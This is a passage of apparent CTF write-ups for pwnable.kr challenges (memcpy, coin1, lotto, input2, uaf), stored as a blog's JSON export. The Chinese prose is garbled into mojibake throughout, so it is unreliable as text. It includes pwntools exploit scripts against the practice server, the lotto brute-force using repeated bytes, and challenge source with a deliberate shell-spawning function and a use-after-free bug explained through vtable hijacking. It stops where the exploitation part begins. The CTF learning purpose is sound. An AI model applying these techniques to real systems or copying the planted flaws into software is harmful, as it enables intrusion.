= rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for slow_memcpy : %llu\\n&quot;, t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for fast_memcpy : %llu\\n&quot;, t2-t1); printf(&quot;\\n&quot;); &#125; printf(&quot;thanks for helping my experiment!\\n&quot;); printf(&quot;flag : ----- erased in this source code -----\\n&quot;); return 0;&#125; è¿‡ç¨‹åˆ†æ åœ¨ç”³è¯·çš„å†…å­˜å°äº64æ—¶ï¼Œé‡‡ç”¨çš„æ˜¯slow_memcpyé€ä¸ªå­—èŠ‚çš„å¤åˆ¶ï¼Œæ²¡æœ‰å…¶ä»–è¦æ±‚ï¼Œä½†æ˜¯é€Ÿåº¦è¾ƒæ…¢ 1234567char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125; åœ¨å¤åˆ¶å†…å­˜å¤§äº64ä¸ªå­—èŠ‚æ—¶ï¼Œé‡‡ç”¨fast_memcpyä¸­çš„æŒ‡ä»¤å¤åˆ¶ï¼Œå¤åˆ¶é€Ÿåº¦å¿« 1234567891011121314151617181920212223242526char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( &quot;movdqa (%0), %%xmm0\\n&quot; &quot;movdqa 16(%0), %%xmm1\\n&quot; &quot;movdqa 32(%0), %%xmm2\\n&quot; &quot;movdqa 48(%0), %%xmm3\\n&quot; &quot;movntps %%xmm0, (%1)\\n&quot; &quot;movntps %%xmm1, 16(%1)\\n&quot; &quot;movntps %%xmm2, 32(%1)\\n&quot; &quot;movntps %%xmm3, 48(%1)\\n&quot; ::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125; ç”¨ä½¿ç”¨æŒ‡ä»¤nc pwnable.kr 9022è¿æ¥ï¼Œéšä¾¿è¾“å…¥äº†ä¸€äº›å€¼è¿‡åå‘ç°æ°¸è¿œåœç•™åœ¨äº†ç¬¬å››æ¬¡æ£€æµ‹ï¼Œä½†æ˜¯å¦‚æœåœ¨æœ¬åœ°è¾“å…¥å´å¯ä»¥é€šè¿‡ movdqaæŒ‡ä»¤ movdqaæŒ‡ä»¤çš„æ“ä½œæ•°éƒ½è¦æ±‚16å­—èŠ‚å¯¹é½ï¼Œåœ¨æœ¬åœ°å¯ä»¥æ­£å¸¸è¿è¡Œæ—¶å› ä¸ºmallocæœ¬èº«å°±æ˜¯8å­—èŠ‚å¯¹é½çš„ï¼ŒåŠ ä¸Š8ä¸ªå­—èŠ‚çš„chunkå¤´ï¼Œmallocè¿”å›çš„æŒ‡é’ˆå°±å·²ç»éµå¾ª16å­—èŠ‚å¯¹é½äº†ï¼Œæ‰€ä»¥éšä¾¿è¾“å…¥ä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯åœ¨é¶æœºä¸Šå¯èƒ½æ˜¯å› ä¸ºUbuntuç‰ˆæœ¬çš„é—®é¢˜ï¼Œchunkåœ¨å†…å­˜ä¸­æ˜¯è¿ç»­çš„ï¼Œè€Œä¸éµå¾ªå†…å­˜å¯¹é½ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå·±è®¡ç®—ã€‚ 123456789# è®¡ç®—åœ¨èŒƒå›´ä¸­å¯è¾“å…¥çš„æ•°å­—é‚£äº›ç¬¦åˆè¦æ±‚for i in range(3, 13): if i&lt;6: chunk_size[i-3].append(pow(2,i)) if i &gt;= 6: for size in range(pow(2, i), pow(2, i+1)): if (size-8)%16 == 0: chunk_size[i-3].append(size) exp12345678910111213141516171819202122from pwn import *import oscontext.log_level = &#x27;debug&#x27;sh = remote(&#x27;pwnable.kr&#x27;, 9022)chunk_size = [[], [], [], [], [], [], [], [], [], [], []]for i in range(3, 13): if i&lt;6: chunk_size[i-3].append(pow(2,i)) if i &gt;= 6: for size in range(pow(2, i), pow(2, i+1)): if (size-8)%16 == 0: chunk_size[i-3].append(size)for i in range(3, 13): string = &#x27;specify the memcpy amount between &#123;&#125; ~ &#123;&#125; : &#x27;.format(pow(2,i), pow(2,i+1)) sh.sendlineafter(string, str(chunk_size[i-3][0]))sleep(3)log.success(sh.recv()) æ¥æ”¶","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"pwn","slug":"ctf/pwn","permalink":"http://example.com/categories/ctf/pwn/"},{"name":"pwnable.kr","slug":"ctf/pwn/pwnable-kr","permalink":"http://example.com/categories/ctf/pwn/pwnable-kr/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr coin1","slug":"ctf/pwn/pwnable/pwnable.kr-coin1","date":"2021-07-14T04:44:16.840Z","updated":"2022-01-01T09:55:02.164Z","comments":true,"path":"7286/","link":"","permalink":"http://example.com/7286/","excerpt":"","text":"ncè¿ä¸Šå»çœ‹çœ‹ ä¸€ä¸ªæ‰¾å‡ç¡¬å¸æ¸¸æˆï¼Œå¤§æ¦‚æ„æ€ä¸ºï¼š Næ˜¯ç¡¬å¸ä¸ªæ•°ï¼ŒCæ˜¯è¾“å…¥æ¬¡æ•°ï¼Œè¾“å…¥ç›¸åº”çš„ç¡¬å¸ä¸‹æ ‡ä¼šç»™ä½ ç¡¬å¸çš„é‡é‡ï¼ˆå›¾ä¸­è¾“å…¥0ä»£è¡¨ç¬¬ä¸€ä¸ªç¡¬å¸ï¼Œ10æ˜¯ä¸€ä¸ªçœŸç¡¬å¸çš„é‡é‡ï¼Œè¾“å…¥0,1è¿”å›20ï¼Œä»£è¡¨ä¸¤ä¸ªçœŸç¡¬å¸çš„é‡é‡ï¼‰ å½“æ¬¡æ•°ç”¨å®Œæ—¶ï¼Œéœ€è¦è¾“å…¥å‡ç¡¬å¸å¯¹åº”çš„ä¸‹æ ‡ï¼Œ æ•´ç†å®Œè¿‡åå°±æ˜¯ä¸€ä¸ªé¢˜ç›®è€ƒå¯Ÿæˆ‘ä»¬çš„äºŒåˆ†æŸ¥æ‰¾èƒ½åŠ›ï¼Œå°±æ˜¯å†™ä»£ç èƒ½åŠ›ï¼Œä½†æ˜¯è¿™ä¸ªä»£ç æˆ‘è°ƒè¯•äº†ä¸€ä¼šå„¿ã€‚ã€‚ï¼ˆå¤ªèœäº†ï¼‰ğŸ˜” expè„šæœ¬é‡Œé¢ç”¨åˆ°äº†æ­£åˆ™è¡¨è¾¾å¼æ¥æå–å­—ç¬¦ä¸²ä¸­çš„æ•°å­—ï¼Œå‚è€ƒäº†è¿™ç¯‡æ–‡ç« ï¼ˆé“¾æ¥ï¼‰ å› ä¸ºé“¾æ¥çš„ç«¯å£åªå¼€æ”¾ä¸€åˆ†é’Ÿï¼Œæˆ‘è¿™å„¿ç½‘é€Ÿæœ‰é™ï¼Œå°±åœ¨pwnable.krçš„æœåŠ¡å™¨ä¸Šå»è¿è¡Œä»£ç äº† 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *import redef MakeFlat(low, high): Flat = &#x27;&#x27; mid = (low + high) // 2 for i in range(low, mid): Flat += str(i) + &#x27; &#x27; #log.info(&#x27;[&#x27;+Flat+&#x27;]&#x27;) return Flatdef BinarySearch(n, c): low = 0 high = n correct = &#x27;&#x27; for i in range(c): mid = (low + high) // 2 flat = MakeFlat(low, high) sh.sendline(flat) p = sh.recv() #log.success(p) if int(p) == 9: correct = flat continue if int(p) &lt; (mid - low) * 10: high = mid elif int(p) == (mid - low) * 10: low = mid correct = str(high - 1) log.success(&#x27;correct index: &#x27; + correct) sh.sendline(correct) log.success(sh.recv())def N_C(): #sleep(3) Flat = sh.recv() log.info(Flat) ListOfNaC = map(int, re.findall(&#x27;\\d+&#x27;, Flat)) return ListOfNaCif __name__ == &quot;__main__&quot;: #context.log_level = &#x27;debug&#x27; sh = remote(&#x27;pwnable.kr&#x27;, 9007) sh.recvuntil(&#x27;\\t- Ready? starting in 3 sec... -\\n\\t\\n&#x27;) sleep(3) for i in range(100): _list = N_C() BinarySearch(_list[0], _list[1]) log.success(sh.recv()) sh.close()","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"pwn","slug":"ctf/pwn","permalink":"http://example.com/categories/ctf/pwn/"},{"name":"pwnable.kr","slug":"ctf/pwn/pwnable-kr","permalink":"http://example.com/categories/ctf/pwn/pwnable-kr/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr lotto","slug":"ctf/pwn/pwnable/pwnable.kr-lotto","date":"2021-07-14T04:44:16.840Z","updated":"2022-01-01T09:55:26.752Z","comments":true,"path":"33592/","link":"","permalink":"http://example.com/33592/","excerpt":"","text":"åˆ©ç”¨scpå‘½ä»¤ä»æœåŠ¡å™¨ä¸‹è½½æºç åˆ°æœ¬åœ° 1scp -P 2222 -r lotto@pwnable.kr: /home/lotto/ /home/fish ç¨‹åºæºä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play()&#123; int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1)&#123; printf(&quot;error. tell admin\\n&quot;); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf(&quot;error2. tell admin\\n&quot;); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; // win! if(match == 6)&#123; system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;bad luck...\\n&quot;); &#125;&#125;void help()&#123; printf(&quot;- nLotto Rule -\\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\\n&quot;); printf(&quot;for more details, follow the link below\\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\\n&quot;);&#125;int main(int argc, char* argv[])&#123; // menu unsigned int menu; while(1)&#123; printf(&quot;- Select Menu -\\n&quot;); printf(&quot;1. Play Lotto\\n&quot;); printf(&quot;2. Help\\n&quot;); printf(&quot;3. Exit\\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu)&#123; case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\\n&quot;); return 0; default: printf(&quot;invalid menu\\n&quot;); break; &#125; &#125; return 0;&#125; åœ¨æœ¬åœ°è¿è¡Œç¨‹åºäº†è§£è¿‡ç¨‹ï¼Œæ„Ÿè§‰ç›¸å½“äºä¸€ä¸ªçŒœæ•°æ¸¸æˆï¼Œåˆ†æç¨‹åºä»£ç  éšæœºæ•°123456789101112131415// generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1)&#123; printf(&quot;error. tell admin\\n&quot;); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf(&quot;error2. tell admin\\n&quot;); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); ä¸Šé¢ä»£ç æ„æ€ä¸ºç”Ÿæˆ6ä¸ªå°äºç­‰äº45çš„éšæœºæ•°ï¼Œåˆšå¼€å§‹æˆ‘ä¸€ä¸ªurandomå’Œrandomæ˜¯ä¸€æ ·çš„ä¼ªéšæœºæ•°ï¼Œä½†æˆ‘ç”¨cè¯­è¨€å†™äº†ä¸€ä¸ªç®€å•çš„ç¨‹åºåå‘ç°å¹¶ä¸ä¸€æ · 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;int main()&#123; int i; unsigned int lotto[6]; int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); read(fd, lotto, 6); for(i = 0; i &lt; 6; i++)&#123; printf(&quot;%d, &quot;,lotto[i] % 45 + 1); &#125; printf(&quot;\\n&quot;);&#125; ç”Ÿæˆ a.outæ–‡ä»¶åè¿è¡Œç»“æœ æ‰€ä»¥è¿™é“é¢˜å¹¶ä¸èƒ½ä½¿ç”¨ä¼ªéšæœºçš„ç‰¹æ€§æ¥åš æ£€æµ‹ç»§ç»­åˆ†æä¸‹é¢çš„æ£€æµ‹å‡½æ•° 12345678int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; è¿™æ®µä»£ç å¾ˆæœ‰æ„æ€ï¼Œæˆ‘çœ‹ç¬¬ä¸€éæ—¶æ²¡æƒ³é‚£ä¹ˆå¤šï¼Œåªæ˜¯æƒ³åˆ°äº†è¾“å…¥çš„6ä¸ªå­—èŠ‚çš„é¡ºåºä¸ä¸€å®šè¦å’Œlottoæ•°ç»„ä¸­çš„æ•°æ®é¡ºåºç›¸åŒï¼Œä½†æ˜¯åœ¨åé¢å‘ç°è¿™é‡Œé¢å­˜åœ¨ä¸€ä¸ªç‚¹å°±æ˜¯ï¼Œè¿™æ²¡è€ƒè™‘æˆ‘ä»¬è¾“å…¥çš„6ä¸ªå­—èŠ‚å…¨æ˜¯ä¸€æ ·çš„æƒ…å†µï¼Œå¯ä»¥åˆ©ç”¨çˆ†ç ´ expè¿™é‡Œæ³¨æ„ä¸€ç‚¹ç»†èŠ‚æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—èŠ‚å¤§å°éœ€è¦å°äºç­‰äº45æ‰å¯ä»¥ 1234567891011121314151617from pwn import *#context.log_level = &#x27;debug&#x27;payload = b&#x27;######&#x27;sh = ssh(&#x27;lotto&#x27;, &#x27;pwnable.kr&#x27;, password = &#x27;guest&#x27;, port = 2222)p = sh.process(&#x27;./lotto&#x27;)while True: p.sendline(&#x27;1&#x27;) p.sendlineafter(&#x27;Submit your 6 lotto bytes : &#x27;,payload) msg = p.recv() if &#x27;bad luck&#x27; not in msg: sleep(3) log.success(msg) breakp.close()sh.close()","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"pwn","slug":"ctf/pwn","permalink":"http://example.com/categories/ctf/pwn/"},{"name":"pwnable.kr","slug":"ctf/pwn/pwnable-kr","permalink":"http://example.com/categories/ctf/pwn/pwnable-kr/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr input2","slug":"ctf/pwn/pwnable/pwnable.kr-input2","date":"2021-07-14T04:44:16.840Z","updated":"2022-01-01T09:55:14.567Z","comments":true,"path":"37476/","link":"","permalink":"http://example.com/37476/","excerpt":"","text":"readå‡½æ•°ä»æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„ç®¡é“å£è¯»å…¥æŒ‡å®šå­—èŠ‚çš„å­—ç¬¦ä¸²åˆ°æŒ‡å®šçš„æ•°ç»„ä¸­ writeå‡½æ•°ä»æŒ‡å®šçš„æ•°ç»„ä¸­å†™å…¥æŒ‡å®šæ•°é‡çš„å­—èŠ‚åˆ°æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„ç®¡é“å£ å¸¸è§çš„ ä¸‰ç§ 0ï¼Œ 1ï¼Œ 2 åˆ†åˆ«è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†é”™è¯¯ pipeå‡½æ•°dup&amp;dup2å‡½æ•° å¤åˆ¶ä¸€ä»½ç›¸åŒçš„æ–‡ä»¶æè¿°ç¬¦ forkå‡½æ•°åœ¨å½“å‰çˆ¶è¿›ç¨‹åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹è¿”å›å¾—fpid == 0 æ–‡ä»¶æè¿°ç¬¦ å®ä¾‹1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;int main()&#123; char buffer2[100]; char buffer[] = &quot;Let&#x27;s study pipe!&quot;; int fd[2]; pid_t fpid; pipe(fd); fpid = fork(); //printf(&quot;%d %d \\n&quot;, fd[0], fd[1]); if(fpid &lt; 0)&#123; perror(&quot;fork error\\n&quot;); &#125; else if(fpid &gt; 0)&#123; //çˆ¶è¿›ç¨‹ å‘ç®¡é“ä¸­å†™å…¥æ•°æ® close(fd[0]); write(fd[1], buffer, strlen(buffer) + 1); printf(&quot;father process input buffer in pipe success!\\n&quot;); &#125; else if(fpid == 0)&#123; //å­è¿›ç¨‹ ä»ç®¡é“ä¸­è¯»å‡ºæ•°æ® close(fd[1]); read(fd[0], buffer2, strlen(buffer) + 1); printf(&quot;son process output buffer in pipe success!\\n&quot;); printf(&quot;the buffer in pipe is %s\\n&quot;, buffer2); &#125; return 0;&#125; ä¸Šè¿°ä»£ç çš„ä½œç”¨ä½çˆ¶è¿›ç¨‹å°†bufferå­—ç¬¦ä¸²æ•°æ®å†™å…¥ç®¡é“ä¸­ï¼Œå­è¿›ç¨‹ä»ç®¡é“ä¸­è¯»å…¥æ•°æ®åˆ°æ–°æ•°ç»„buffer2ä¸­ ç¼–è¯‘è¾“å‡ºå ç¼“å†²åŒºä¸‰ç§ç¼“å†² å…¨ç¼“å†²ï¼Œè¡Œç¼“å†²ï¼Œä¸ç¼“å†²","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"pwn","slug":"ctf/pwn","permalink":"http://example.com/categories/ctf/pwn/"},{"name":"pwnable.kr","slug":"ctf/pwn/pwnable-kr","permalink":"http://example.com/categories/ctf/pwn/pwnable-kr/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"pwnable.kr uaf","slug":"ctf/pwn/pwnable/pwnable..kr-uaf","date":"2021-07-14T04:44:16.830Z","updated":"2022-01-01T09:55:43.884Z","comments":true,"path":"32386/","link":"","permalink":"http://example.com/32386/","excerpt":"","text":"æºç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system(&quot;/bin/sh&quot;); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public:Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0;&#125; Ues After Freeâ€‹ uafçš„åŸç†å…¶å®å¹¶ä¸éš¾æ‡‚ï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ªè¿·é€”æŒ‡é’ˆï¼Œä¹Ÿç§°ä¸ºé‡æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆæ—¶å› ä¸ºåœ¨ä½¿ç”¨ç©åˆ†é…çš„å †ç©ºé—´åæ²¡æœ‰å°†æŒ‡å‘å †çš„æŒ‡é’ˆåˆ¶ç©ºé€ æˆçš„ï¼Œåˆ©ç”¨é‡æŒ‡é’ˆæˆ‘ä»¬å¯ä»¥å‘è¿™å—å †ä¸­å†™å…¥ä¸€äº›ä¸œè¥¿ï¼Œç„¶ååœ¨ç”³è¯·å †ç©ºé—´ï¼Œåœ¨é‡Šæ”¾å®Œåé©¬ä¸Šåˆç”³è¯·ä¼šç”³è¯·åˆ°é‚£æ®µåˆšåˆšé‡Šæ”¾çš„å †ç©ºé—´ã€‚ è¿™ä¸ªæ˜¯æœ€ç®€å•çš„uafç¨‹åº 123456789101112131415#include &lt;stdio.h&gt;int main()&#123; char *p0; p0=(char *)malloc(sizeof(char)*10); //æŒ‡é’ˆp0ç”³è¯·å†…å­˜ï¼› memcpy(p0,&quot;hello&quot;,10); printf(&quot;p0 Addr:%x,%s\\n&quot;,p0,p0); //æ‰“å°å…¶åœ°å€ä¸å€¼ï¼› free(p0); //é‡Šæ”¾p0ï¼› char *p1; p1==(char *)malloc(sizeof(char)*10); memcpy(p1,&quot;word&quot;,10); printf(&quot;p1 Addr:%x,%s\\n&quot;,p1,p0); return 0;&#125; C++çš„ä¸€äº›çŸ¥è¯†ç‚¹å¤šæ€â€‹ è¿™ä¸ªæ¦‚å¿µåœ¨åœ¨wikiä¸Šè§£é‡Šå¾—éå¸¸æŠ½è±¡ï¼Œä½†æ˜¯ä¸Šé¢çš„æºç å…¶å®æŒºé€‚åˆæˆ‘ä»¬ç†è§£çš„ï¼ŒManå’ŒWomanéƒ½ç»§æ‰¿äº†Personè¿™ä¸ªç±»ï¼Œintroduceè¿™ä¸ªåŠ¨ä½œæ˜¯æ‰€æœ‰äººéƒ½æœ‰çš„ï¼Œä½†æ˜¯ç»†åˆ†åˆ°Manå’ŒWomanæ—¶ä»–ä»¬ä¹‹é—´çš„introduceåˆä¸ä¸€æ ·äº†ï¼Œè¿™å°±æ˜¯å¤šæ€ã€‚ â€‹ æˆ‘çš„ç†è§£ä¸ºï¼Œåœ¨äºå‚è€ƒç³»çš„ä¸åŒï¼Œè¿™æ ·å°±å­˜åœ¨å®è§‚ä¸å¾®è§‚çš„åŒºåˆ«ã€‚ã€‚æ€ªå¼‚çš„ç†è§£ã€‚ è™šè¡¨â€‹ c++é¢å‘å¯¹è±¡ç¼–ç¨‹çš„å¤šæ€æ€§éœ€è¦ç”±è™šè¡¨æ¥å®ç°ã€‚ â€‹ è™šè¡¨é€šä¿—æ¥è®²å°±æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„é‡Œé¢çš„æŒ‡é’ˆæŒ‡å‘äº†ç±»ä¸­çš„è™šå‡½æ•°ï¼Œä½†æ˜¯è™šå‡½æ•°è¡¨å¹¶ä¸å­˜æ”¾åœ¨ç±»ä¸­ï¼Œç±»ä¸­åªæœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘è™šå‡½æ•°è¡¨ã€‚è€Œåœ¨c++ä¸­åŒä¸€ä¸ªç±»çš„å¯¹è±¡å…±ç”¨ä¸€å¼ è™šè¡¨ã€‚ ç±»åœ¨å†…å­˜ä¸­çš„ç»“æ„12345678910111213+------------------------+ virtual talbe + virtual table pointer + ----&gt; +---------------+ +------------------------+ + func1 pointer + + characteristic _ 1 + + --------------++------------------------+ + func2 pointer ++ characteristic _ 2 + +---------------++------------------------+ + func3 pointer ++ characteristic _ 3 + +---------------++------------------------++ ........... ++------------------------++ characteristic _ n ++------------------------+ ç¨‹åºåˆ†æåˆ†æ ç¨‹åºå¼€å§‹ç”³è¯·äº†ä¸¤å—å†…å­˜ 12Human* m = new Man(&quot;Jack&quot;, 25);Human* w = new Woman(&quot;Jill&quot;, 21); ç”¨æˆ·é€‰æ‹©èœå•ï¼ˆ1.è°ƒç”¨æ–¹æ³•ã€‚2.ç”³è¯·å†…å­˜ï¼Œè¯»å…¥å‚æ•°ã€‚3.é‡Šæ”¾å†…å­˜ï¼‰ 12345678910111213141516switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break;&#125; å¯ä»¥å‘ç°ç¨‹åºæ²¡æœ‰å¯¹é‡Šæ”¾å†…å­˜åçš„æŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨é‡æŒ‡é’ˆï¼Œè€Œé€‰æ‹©è€Œåˆå¯ä»¥ç”³è¯·å†…å­˜ï¼Œæ»¡è¶³UAFæ¼æ´çš„è§¦å‘æ¡ä»¶ã€‚åˆæ­¥çš„æƒ³æ³•å°±æ˜¯å…ˆ3åœ¨2ï¼ˆå…ˆé‡Šæ”¾åç”³è¯·ï¼‰ï¼Œåœ¨å‘ç”³è¯·çš„ç©ºé—´ä¸­å†™å…¥ä¸œè¥¿ï¼Œç°åœ¨çš„é—®é¢˜æ˜¯å†™ä»€ä¹ˆè¿›å»ã€‚é‡Šæ”¾çš„ç©ºé—´æ˜¯ç±»ï¼Œå†™å…¥çš„æ•°æ®æ”¹å˜çš„æ˜¯ç±»ï¼Œå¦‚æœç±»æœ‰è™šå‡½æ•°ï¼Œé‚£ä¹ˆç±»ç»“æ„çš„å¼€å¤´å°±æ˜¯è™šè¡¨æŒ‡é’ˆã€‚æˆ‘ä»¬æ”¹å˜çš„å°±æ˜¯è™šè¡¨æŒ‡é’ˆï¼Œæ”¹å˜è™šè¡¨æŒ‡é’ˆçš„ä½œç”¨å¯ä»¥é€šè¿‡IDAæŸ¥çœ‹åç¼–è¯‘ä»£ç æ¥å­¦ä¹  IDAåç¼–è¯‘æ¥ç†è§£è™šå‡½æ•°è¡¨è·Ÿè¸ªå˜é‡v12å’Œv13 ä¸‹é¢è¿™é‡Œæœ‰ç‚¹éš¾çœ‹æ‡‚ï¼Œå¦‚æŒ‡é’ˆæ²¡æœ‰å­¦å¥½çœ‹è¿™ç§ä¸€å®šä¼šçœ‹æ™•ã€‚æˆ‘å°½é‡å†™æ¸…æ¥šä¸€ç‚¹ é¦–å…ˆè¦æ˜ç™½v12,v13è¿™ä¸¤ä¸ªå˜é‡å­˜æ”¾çš„æ˜¯å¯¹è±¡è™šè¡¨çš„åœ°å€ï¼Œå› ä¸ºä¸¤ä¸ªå˜é‡ç±»å‹å’Œæ“ä½œæ–¹æ³•ä¸€æ ·ï¼Œæˆ‘åªè¯´v12å°±å¯ä»¥äº† å°†v12å¼ºè½¬æˆQWORD*ç±»å‹ï¼Œåœ¨å–è¿™ä¸ªåœ°å€ä¸­çš„å€¼ï¼ŒQWORDå 8ä¸ªå­—èŠ‚ï¼Œä¸€æ¬¡å–8ä½ï¼Œå–å‡ºçš„è¿™8ä½å°±æ˜¯è™šè¡¨çš„é¦–åœ°å€ è™šè¡¨é¦–åœ°å€åŠ +8ï¼Œä»£è¡¨å–è™šè¡¨ä¸­çš„ç¬¬äºŒä¸ªå‡½æ•°æŒ‡é’ˆ å°†å‡½æ•°æŒ‡é’ˆèµ‹å€¼ï¼Œåœ¨è°ƒç”¨ï¼Œå‚æ•°å°±æ˜¯å¯¹è±¡æœ¬èº«ï¼ˆthisæŒ‡é’ˆ)ï¼Œå¦‚æœä¸æ‡‚thisæŒ‡é’ˆå»Googleäº†è§£ä¸‹ï¼Œå¾ˆé‡è¦ã€‚ åˆ©ç”¨â€‹ 